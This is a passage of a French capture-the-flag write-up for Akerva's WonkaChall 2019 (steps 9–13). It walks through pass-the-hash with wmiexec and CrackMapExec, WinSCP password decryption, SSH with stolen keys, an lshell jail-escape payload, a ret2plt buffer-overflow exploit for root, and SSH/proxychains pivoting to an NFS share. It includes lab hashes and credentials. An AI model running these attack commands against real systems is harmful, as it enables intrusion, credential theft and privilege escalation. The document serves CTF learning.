06/20/2019  12:32 PM             1,446 Microsoft Edge.lnk
06/22/2019  11:46 PM             1,130 WinSCP.lnk
               3 File(s)          2,858 bytes
               2 Dir(s)  11,220,193,280 bytes free
```

Avec un peu de recherche, on découvre qu'il est possible de récupérer des infos dans WinSCP lorsqu'il n'y a pas de master key. Pour récupérer les infos de veruca dans WinSCP, il existe deux méthodes, une méthode "à la main" et une méthode automatisée.

#### Method 1 - Boring way

Avec le hash de `adminWorkstation`, on peut se connecter via wmiexec :

```bash
wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d
```

Maintenant, il suffit de requêter la registry pour récupérer les infos désirées :

![](/img/writeups/wonkachall2019/step9_regquery.png)
_Fig 33_ : Get veruca's password and IP - boring way

Grâce au binaire trouvé ici : https://github.com/anoopengineer/winscppasswd/releases

Il est alors possible de décoder le mot de passe de Veruca sur la Commando :

```bash
.\winscppasswd 172.16.69.78 veruca A35C4356079A1F0870112F60D87D2A392E293F3D6D6B6E726D6A726A65726B641F29353535350519196F2E6F7DEB849B0EDE

CuiiiiYEE3r3!
```

#### Method 2 - Automated way

Pour cette méthode, c'est [@lydericlefebvre](https://twitter.com/lydericlefebvre?lang=fr), organisateur du challenge, qui m'a donné l'astuce, une fois que j'avais flag évidemment ;)

La méthode automatisée, se fait avec CrackMapExec, et ça marche vachement bien :

```bash
cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY' -M invoke_sessiongopher
```

![](/img/writeups/wonkachall2019/step9_cme_veruca.png)
_Fig 34_ : Get veruca's password and IP - automated way

On a donc les identifiants :

> veruca@172.16.69.78 : CuiiiiYEE3r3!

### SSH veruca's machine

Bien, on touche au but. Nous avons les identifiants de Veruca et son IP, qui est sur une autre route que celle montée par le VPN. Il suffit d'en déclarer une nouvelle :

```bash
➜ ip r | grep tun0
10.8.0.1 via 10.8.0.9 dev tun0 
10.8.0.9 dev tun0 proto kernel scope link src 10.8.0.10 
172.16.42.0/24 via 10.8.0.9 dev tun0 

➜ sudo ip route add 172.16.69.0/24 via 10.8.0.9 dev tun0
```

C'est le moment de se connecter en SSH :

![](/img/writeups/wonkachall2019/step9_flag.png)
_Fig 35_ : SSH connection and flag

### Flag

> 83907d64b336c599b35132458f7697c4eb0de26635b9616ddafb8c53d5486ac2

---

### Resources

1. __Paul Lammertsma__, _Where does WinSCP store site's password?_, SuperUser : https://superuser.com/questions/100503/where-does-winscp-store-sites-password
2. __anoopengineer__, _WinSCP Password Extractor/Decrypter/Revealer_, GitHub : https://github.com/anoopengineer/winscppasswd/
3. __Vivek Gite__, _Linux route Add Command Examples_, cyberciti : https://www.cyberciti.biz/faq/linux-route-add/

## Step 10 - The Great Escape

> Run Otman run, get out of this jail! 

![](https://media.giphy.com/media/Y8wgPlCWM5jWg/giphy.gif)

### TL;DR

1. Trouver l'autre machine via ARP : `cat /proc/net/arp`
2. Remarquer qu'il y a deux serveurs web installés : Apache et nginx
3. Dans la configuration du nginx, trouver la racine du site : `/usr/share/nginx/dev3.challenge.akerva.com`
4. Récupérer une clé privé SSH dans ce dossier
5. Grâce à l'indice de Akerva, on sait qu'il faut se connecter avec l'utilistaeur `violet`
6. Attérir dans un `lshell`
7. Sur le GitHub de `lshell`, il y a une issue de sécurité qui va nous permettre de s'échapper de la jail
8. Executer le payload : `echo opmd && cd () bash && cd` et récupérer le flag

---

### State of the art

Le premier reflexe est de vérifier le cache `arp` :

```bash
veruca@SRV01-WEB-WW3:~$ cat /proc/net/arp 
IP address       HW type     Flags       HW address            Mask     Device
172.16.69.254    0x1         0x2         3e:20:13:a5:09:49     *        ens18
172.16.69.65     0x1         0x2         96:2e:20:a6:a0:f3     *        ens18
```

On a donc une nouvelle IP : `172.16.69.65`

Après avoir essayé de réutiliser les identifiants de veruca sans succès, j'ai décidé de faire un scan de port sur les deux machines :

#### 172.16.69.65 

```bash
➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.65           
Discovered open port 22/tcp on 172.16.69.65                                                                     
```

#### 172.16.69.78 (veruca)

```bash
➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.78            
Discovered open port 80/tcp on 172.16.69.78                                    
Discovered open port 22/tcp on 172.16.69.78                                    
```

Sur la machine de Veruca, il y a un port 80, donc surement un serveur web, mais sans rien dans le `/var/www/html` :

```bash
veruca@SRV01-WEB-WW3:~$ ls /var/www/html
index.html  index.nginx-debian.html
```

Cependant, il semblerait que ce soit du nginx. On va vérifier la configuration du serveur et des `sites-available` :

```bash
veruca@SRV01-WEB-WW3:~$ ls /etc/nginx/sites-available
default  dev3.challenge.akerva.com

veruca@SRV01-WEB-WW3:~$ cat /etc/nginx/sites-available/dev3.challenge.akerva.com
server {
	server_name dev3.challenge.akerva.com;
	listen 80;
	listen [::]:80;
	root /usr/share/nginx/dev3.challenge.akerva.com;
	index index.html index.php;
	autoindex off;
	
	add_header X-Frame-Options SAMEORIGIN;
	add_header X-Content-Type-Options nosniff;
	add_header X-XSS-Protection "1; mode=block";

	location / {
		if (-f /usr/share/nginx/dev3.challenge.akerva.com/error/index.html){
		return 503;
		}
	}
	
	location  ~ /\.{
		deny all;
		access_log off;
		log_not_found off;
	}
	
	#Error pages
	error_page 503 /index.html;
	location = /index.html {
		root /usr/share/nginx/dev3.challenge.akerva.com/error/;
		internal;
	}
	
	location ~ ^/.*\.php {
            try_files $uri =503;
            include fastcgi_params;
            fastcgi_pass unix:/run/php/php7.3-fpm.sock;
            fastcgi_split_path_info ^/(.+\.php)(/.*)$;
            fastcgi_index index.php;
            fastcgi_param HTTPS on;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param PATH_INFO $fastcgi_path_info;
            fastcgi_intercept_errors on;
        }

}
```

Il y a aussi un server Apache mais qui ne sert à rien.

### dev3 website home

Avec le fichier de configuration, on sait que le home du site se situe ici : `/usr/share/nginx/dev3.challenge.akerva.com`

```bash
veruca@SRV01-WEB-WW3:~$ ls -la /usr/share/nginx/dev3.challenge.akerva.com
total 24
drwxr-xr-x 6 root     root     4096 juil.  5 11:08 .
drwxr-xr-x 5 root     root     4096 juin  21 18:42 ..
drwxr-xr-x 2 www-data www-data 4096 juin  26 17:01 error
drwxr-xr-x 2 www-data www-data 4096 juil.  4 10:52 golden_tickets
drwxr-xr-x 2 www-data www-data 4096 juin  26 18:02 keys
drwxr-xr-x 2 www-data www-data 4096 juil.  5 11:08 scripts
veruca@SRV01-WEB-WW3:~$ ls -la /usr/share/nginx/dev3.challenge.akerva.com/keys
total 12
drwxr-xr-x 2 www-data www-data 4096 juin  26 18:02 .
drwxr-xr-x 6 root     root     4096 juil.  5 11:08 ..
-rw-r----- 1 www-data www-data 1679 juin  26 18:02 id_rsa
```

Ah bah voilà, une clé privé, sachant qu'il n'y a qu'un port 22 ouvert sur l'autre machine, je suppose qu'il doit y avoir un lien. L'utilisateur pour se connecter est visible dans le hint sur la plateforme de Akerva : `violet`

La clé privé est disponible ici : https://mega.nz/#!Lj4DlAqD!QCLeAbjrbXU5QkCT8pGOXATWDV4jNjv4wuKc_nKoc9w

### SSH connection

Une simple connexion ssh avec une clé privée : 

![](/img/writeups/wonkachall2019/step10_lshell.png)
_Fig 36_ : SSH connection and restricted shell

### Escaping the restricted shell

Bon, nous sommes dans un shell restreint, enfin un `limited shell`, soit lshell : https://github.com/ghantoos/lshell

Pour s'échapper d'un shell restreint qui n'est pas un challenge de CTF, il faut regarder les issues du git. Ici, il n'y a qu'une issue de securité active : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754

L'utilisateur `omega8cc` montre une technique d'escape qui fonctionne bien :

```bash
echo FREEDOM! && cd () bash && cd
```

![](/img/writeups/wonkachall2019/step10_escapeshell.png)
_Fig 37_ : Shell escape

Le flag se situe dans le home de violet :

```bash
violet@SRV02-BACKUP:/usr/local/share/golden_tickets$ cat /etc/passwd|grep violet
violet:x:1000:1000:violet,,,:/home/violet:/usr/bin/lshell
violet@SRV02-BACKUP:/usr/local/share/golden_tickets$ ls /home/violet
flag-10.txt
violet@SRV02-BACKUP:/usr/local/share/golden_tickets$ cat /home/violet/flag-10.txt
d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
```

### Flag

> d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865

---

### Resources

1. __ghantoos__, _lshell - SECURITY ISSUE: Inappropriate parsing of command syntax_, GitHub : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754

## Step 11 - Basic enumeration

>  Free for all \o/ 

![](https://media.giphy.com/media/3og0IBJHNHCZIwdnX2/giphy-downsized-large.gif)

### TL;DR

1. Remarquer qu'il existe des fichiers world readable dans le `/home`
2. Lire la clé privé de Georgina
3. Se connecer avec cette clé et flag

---

### State of the art

Alors cette partie a été très très vite. Il n'y a pas grand chose à dire, dans le `/home` il y a le dossier de `georgina`. Sa clé privé est en world readable:

![](/img/writeups/wonkachall2019/step11_worldreadable.png)
_Fig 38_ : World readable private key

La clé privé est disponible ici : https://mega.nz/#!7r5BEYBR!q02ij1f1vGJ8cgXDdrmfkKaHK16cFwngdTuDzqqJ6u8

### SSH connection

```bash
➜ chmod 0600 ~/Documents/id_rsa_georgina 
➜ ssh georgina@172.16.69.65 -i ~/Documents/id_rsa_georgina
Linux SRV02-BACKUP 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul  8 11:04:07 2019 from 10.9.0.10
georgina@SRV02-BACKUP:~$ cat flag-11.txt 
5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5
```

### Flag

> 5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5

---

## Step 12 - Return to PLankTon

> Pwn2Own

![](https://media.giphy.com/media/POJt9CrJmvN5PageSf/giphy-downsized-large.gif)

### TL;DR

1. Avec `LinEnum`, remarquer un binaire `exportVIP` qui est SUID et SGID
2. En fuzzant rapidement,trouver l'overflow et le padding de 296
3. Regarder la `plt` du binaire et les protections, voir que c'est un `ret2plt`
4. Comme c'est du 64 bits, il faut récupérer un gadget `pop rdi; ret` dans le binaire
5. Faire un script `GNU` qui execute un bash et l'ajouter dans le PATH
6. Exploiter le `ret2plt` avec un joli onliner : `/opt/exportVIP < <(python -c 'from pwn import *; print "a"*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat)`

---

### State of the art

C'est le moment de faire un peu d'enumération pour essayer de root la machine. Pour celà, on a `LinEnum` :

```bash
./LinEnum.sh -s -r report -e /dev/shm -t

[...]
[-] SUID files:
-rwsr-xr-x 1 root root 10232 mars  28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 440728 mars   1 17:19 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 juin   9 23:42 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 59680 mai   17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 50040 mai   17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 75792 mai   17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40504 mai   17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 40312 mai   17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 1019656 mai   28 22:13 /usr/sbin/exim4
-rwsr-xr-x 1 root root 40536 mai   17  2017 /bin/su
-rwsr-xr-x 1 root root 44304 mars   7  2018 /bin/mount
-rwsr-xr-x 1 root root 31720 mars   7  2018 /bin/umount
-rwsr-xr-x 1 root root 61240 nov.  10  2016 /bin/ping
-rwsr-s---+ 1 root root 14392 juil.  8 11:03 /opt/exportVIP
-rwsr-xr-x 1 root root 110760 mars  20  2017 /sbin/mount.nfs

[-] SGID files:
-rwxr-sr-x 1 root mail 19008 janv. 17  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root ssh 358624 mars   1 17:19 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 40264 oct.   7  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 27448 mars   7  2018 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71856 mai   17  2017 /usr/bin/chage
-rwxr-sr-x 1 root shadow 22808 mai   17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 14768 avril 12  2017 /usr/bin/bsd-write
-rwxr-sr-x 1 root mail 10952 déc.  25  2016 /usr/bin/dotlock.mailutils
-rwsr-s---+ 1 root root 14392 juil.  8 11:03 /opt/exportVIP
-rwxr-sr-x 1 root shadow 35592 mai   27  2017 /sbin/unix_chkpwd
[...]
```

Le binaire `/opt/exportVIP` a le bit SUID et SGID, c'est probablement par là qu'il faut aller. Pour tester le binaire, je préfère le faire en local : 

```bash
scp -i ~/Documents/id_rsa_georgina georgina@172.16.69.65:/opt/exportVIP .
```

Le binaire est disponible ici : https://mega.nz/#!DrxxwK6a!1hOFmmYMrImfOaGUC6aIfbTn8oPCyDqwDWgBcKSbz24

En analysant un peu le binaire, on voit que la fonction `system` est disponible dans la PLT et que les protections activées sur le binaires sont : le bit NX et l'ASLR.

```bash
➜ checksec --file ./exportVIP
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols       No	0		4	./exportVIP
```

Pour la plt :

```bash
➜ readelf -a ./exportVIP

[...]
Section de réadressage '.rela.plt' à l\'adresse de décalage 0x528 contient 8 entrées:
  Décalage        Info           Type           Val.-symboles Noms-symb.+ Addenda
000000404018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 strncpy@GLIBC_2.2.5 + 0
000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0
000000404030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 system@GLIBC_2.2.5 + 0
000000404038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000404040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 snprintf@GLIBC_2.2.5 + 0
000000404048  000700000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0
000000404050  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0
[...]
```


Le binaire est en 64 bits, il nous faut un gadget `pop rdi; ret` pour placer notre argument. Argument qui sera appelé par la fonction `system`. En sachant ça, on peut faire un binaire custom basé sur une chaine dans le binaire, comme "GNU" et l'ajouter dans le PATH. Le but est de mettre l'adresse de la chaine GNU en paramètre à `system` pour faire un `system('GNU');` et ainsi executer notre code arbitraire. Notre charge final aura la tête suivante :

> padding + gadget + GNU + addr_system

![](/img/writeups/wonkachall2019/stack.jpg)

### Find the padding

Pour trouver le padding d'un buffer overflow, je génère un pattern avec pwntool :

```python
from pwn import *

# generate pattern
cyclic(400)

# find offset
find_cyclic('yaac')
296
```

![](/img/writeups/wonkachall2019/step12_padding.png)
_Fig 39_ : Buffer overflow padding

L'offset est donc de 296 octets.

### System address

Pour trouver l'adresse de `system`, un bon vieux objdump et un grep vont suffir :

```bash
➜ objdump -D ./exportVIP | grep system
0000000000401060 <system@plt>:
  40133d:	e8 1e fd ff ff       	callq  401060 <system@plt>
```

### Find gadget

Pour trouver le gadget, l'outil `ROPGadget` permet de trouver l'adresses des gadgets disponible dans un binaire. Pour rappel on cherche un `pop rdi; ret` :

```bash
./ROPgadget.py --binary ../exportVIP

[...]
0x000000000040145b : pop rdi ; ret
[...]
```

### GNU binary

Notre binaire "GNU" va contenir un simple `bash -p`, l'argument permet de ne pas drop les droits pendant l'execution. 

```bash
#!/bin/bash -p

/bin/bash -p
```

On va le stocker dans `/tmp/GNU` et rajouter `/tmp` dans le PATH. Mais bon, c'est bien beau tous ça, mais il faut trouver l'adresse de la chaine `GNU` dans le binaire :

![](/img/writeups/wonkachall2019/step12_gnuaddr.png)
_Fig 40_ : GNU address

Ce n'est pas vraiment `0x4002d0` l'adresse de GNU, on peut voir que ce n'est pas aligné. Il suffit d'enlever 4 octets :

```python
>>> hex(0x4002d4-0x4)
'0x4002d0'
```

### Exploitation

Bon, on a tout ce qu'il nous faut : le padding, l'adresse du gadget, l'adresse de GNU et l'adresse de système. Il ne reste plus qu'à exploiter. Autre fait marrant, c'est que la librairie "pwntool" est installée sur le système en face, même pas besoin de convertir les adresses !

```bash
/opt/exportVIP < <(python -c 'from pwn import *; print "a"*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat)
```

![](/img/writeups/wonkachall2019/step12_root.png)
_Fig 41_ : Rooted !

Le flag se trouve dans le dossier `/root`.

### Flag

> 6f424a5e3b001ee6a832581680169e2f687d8d6e493bdb4b26d518798f7b3c30

---

### Resources

1. __Rémi Martin__, _Exploitation – ByPass ASLR+NX with ret2plt_, shoxx-website : http://shoxx-website.com/2016/05/exploitation-bypass-aslrnx-with-ret2plt.html
2. __Geluchat__, _Petit Manuel du ROP à l'usage des débutants_, dailysecurity : https://www.dailysecurity.fr/return_oriented_programming/

## Step 13 - The final countdown

>  SHA256(WillyWonka's chief name) 

![](https://media.giphy.com/media/izJTd56RgeU4U/giphy.gif)

### TL;DR

1. Trouver la machine qui manque sur le schéma réseau avec arp : `cat /proc/net/arp`
2. Mettre en place un `proxychains` avec la machine précédente en pivot
3. Faire un scan de port avec nmap sur la nouvelle cible, voir le `nfs` sur le port 2049
4. Monter le nfs distant 
5. Récupérer les fichiers du share
6. Analyser les métadonnées avec `exiftool` pour trouver que `Grandma Josephine` est la patronne de `Willy Wonka`

---

### State of the art

Bon, maintenant qu'on a root la machine, c'est le dernier flag. Mais d'abord on va se mettre à l'aise et récupérer la clé privé dans le dossier root.
Elle est disponible ici : https://mega.nz/#!q25BzSLZ!w9_4B8q7YTCgrUoMYkWPmyRn374xBZhxarUtYmgJJGc

On cherche donc le chef de Willy Wonka. Dans le film de mémoire il n'en a pas, mais ce n'est pas un challenge d'OSINT. Donc on va se ramener à quelque chose qu'un sait faire : de la post exploitation. Même procédé qu'auparavant : commencer par récupérer le cache arp.

```bash
root@SRV02-BACKUP:~# cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.16.69.23     0x1         0x2         ce:d3:94:6c:38:3f     *        ens18
172.16.69.78     0x1         0x2         7a:0a:61:1a:36:65     *        ens18
172.16.69.254    0x1         0x2         3e:20:13:a5:09:49     *        ens18
```

Une nouvelle IP, la .23 ! Celle ci n'a pas l'air d'être accessible depuis mon hôte, on va faire un pivot. 

### Setting up pivoting

Pour faire du pivot, il faut faire du port forwarding avec SSH :

```bash
# Terminal 1
ssh -D 1080 root@172.16.69.65 -i ./id_rsa_root
```

Ensuite, il faut modifier la configuration de proxychains :

```bash
[...]
# Quiet mode (no output from library)
quiet_mode
[...]
socks4 	127.0.0.1 1080
```

### Port scan

Le pivot en place, il n'y a plus qu'à scanner les ports de ce nouvel hote : 

```bash
# Terminal 2
➜  step8 git:(master) ✗ proxychains nmap -F -sT -Pn -T4 -vvv 172.16.69.23 
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-22 01:16 CEST
Initiating Parallel DNS resolution of 1 host. at 01:16
Completed Parallel DNS resolution of 1 host. at 01:16, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:16
Scanning 172.16.69.23 [100 ports]
Discovered open port 22/tcp on 172.16.69.23
Discovered open port 111/tcp on 172.16.69.23
Discovered open port 2049/tcp on 172.16.69.23
Completed Connect Scan at 01:16, 1.41s elapsed (100 total ports)
Nmap scan report for 172.16.69.23
Host is up, received user-set (0.013s latency).
Scanned at 2019-07-22 01:16:54 CEST for 2s
Not shown: 97 closed ports
Reason: 97 conn-refused
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
111/tcp  open  rpcbind syn-ack
2049/tcp open  nfs     syn-ack
```

Quand j'ai vu le `2049` avec nfs, j'ai pas vraiment réfléchis.

### Mouting nfs volume

Je n'ai pas réussi à le monter à travers le proxychains. Du coup je l'ai monté sur la machine rootée :

```bash
root@SRV02-BACKUP# mkdir /tmp/a
root@SRV02-BACKUP# mount -t nfs 172.16.69.23:/ /tmp/a
root@SRV02-BACKUP# cd /tmp/a
root@SRV02-BACKUP:/tmp/a# ls
DATA
```

Le volume est parfaitement monté et il y a pas mal de trucs à l'intérieur :

```bash
root@SRV02-BACKUP:/tmp/a/DATA# ls -laR
[...]
./pictures:
total 11652
drwxr-x--x  2 nobody nogroup    4096 juil.  4 10:51 .
drwxr-xr-x 11 root   root       4096 juin  24 17:43 ..
-rw-r--r--  1 nobody nogroup  131823 juil.  4 10:50 ascenseurRedTeam.png
-rw-r--r--  1 nobody nogroup 1901579 juil.  4 10:50 cinemaRedTeam.png
-rw-r--r--  1 nobody nogroup  196371 juil.  4 10:50 croissantageSaif.png
-rw-r--r--  1 nobody nogroup  130839 juil.  4 10:50 demenagement.png
-rw-r--r--  1 nobody nogroup  153995 juil.  4 10:50 glace.png
-rw-r--r--  1 nobody nogroup   37247 juil.  4 10:50 kenkenken.png
-rw-r--r--  1 nobody nogroup  138224 juil.  4 10:50 keskiamaintenant.png
-rw-r--r--  1 nobody nogroup  190794 juil.  4 10:50 miam.png
-rw-r--r--  1 nobody nogroup  116749 juil.  4 10:50 newyork.png
-rw-r--r--  1 nobody nogroup   86819 juil.  4 10:50 notredame.png
-rw-r--r--  1 nobody nogroup  965251 juil.  4 10:50 onPartEnRestitution.jpg
-rw-r--r--  1 nobody nogroup 2196730 juil.  4 10:50 onVeutDuPain.png
-rw-r--r--  1 nobody nogroup 1039727 juil.  4 10:50 plage.png
-rw-r--r--  1 nobody nogroup  104879 juil.  4 10:50 redabogoss.png
-rw-r--r--  1 nobody nogroup  137275 juil.  4 10:50 redaSport.png
-rw-r--r--  1 nobody nogroup 2043318 juil.  4 10:50 rootagedADsurDouchette.png
-rw-r--r--  1 nobody nogroup  182331 juil.  4 10:50 rootagedemeres.png
-rw-r--r--  1 nobody nogroup 1968672 juil.  4 10:50 soireeAvantPentest.png
-rw-r--r--  1 nobody nogroup   69753 juil.  4 10:50 soireepicol.png
-rw-r--r--  1 nobody nogroup   93357 juil.  4 10:50 toiletteAmehdi.png
[...]
./VIP:
total 408
drwxr-x--x  2 nobody nogroup   4096 juil.  5 16:59 .
drwxr-xr-x 11 root   root      4096 juin  24 17:43 ..
-rw-r--r--  1 nobody nogroup  88168 juil.  5 16:58 flag_lol.jpg
-rw-r--r--  1 nobody nogroup  30234 juil.  3 19:15 INVOICE.docx
-rw-r--r--  1 nobody nogroup 127983 juil.  3 19:15 INVOICE.pdf
-rw-r--r--  1 nobody nogroup 152189 juil.  5 16:58 whiteboard.jpg
```

Beaucoup de photos rigolotes ! Voilà le visage des fous qui ont imaginé ce super challenge :

![](/img/writeups/wonkachall2019/flag_lol.jpg)

### Get VIP files

Je vais récupérer tout le dossier VIP pour récupérer les métadonnées :

```bash
➜ scp -r -i ../id_rsa_root root@172.16.69.65:/tmp/a/DATA/VIP/ .    
INVOICE.pdf                                                                       100%  125KB   1.9MB/s   00:00    
flag_lol.jpg                                                                      100%   86KB   2.6MB/s   00:00    
INVOICE.docx                                                                      100%   30KB   1.9MB/s   00:00    
whiteboard.jpg                                                                    100%  149KB   3.1MB/s   00:00  

➜ exiftool * | grep -i 'author'
Author                          : Grandma Josephine
```

Et le flag est le sha256 de "Grandma Josephine".

### Flag

> b8a3ef108d0c3fac75f3f99f4d6465db8b85b29f41edcfb419a986ca861239f9

---

### Resources

1. __Bima Fajar Ramadhan__, _ProxyChains Tutorial_, linuxhint : https://linuxhint.com/proxychains-tutorial/
2. __Equipe de developpez__, _NFS : le partage de fichiers sous Unix_, developpez.com : https://linux.developpez.com/formation_debian/nfs.html

## Conclusion

Le challenge créé et déployé par Akerva a été très long à résoudre, et probablement encore plus à réaliser. J'ai appris plusieurs petits tricks, comme se connecter à un bucket ou encore les différents type de délégations dans un Active Directory. Sur la partie Linux, c'était plutôt classique, mais quand même très sympa.

Mise à part l'état un peu quantique pour le psexec, aucuns problèmes à signalés, le réseau et les épreuves étaient stables. En bref, un grand merci à l'équipe qui s'est occupé d'organiser ce challenge.

A l'année prochaine !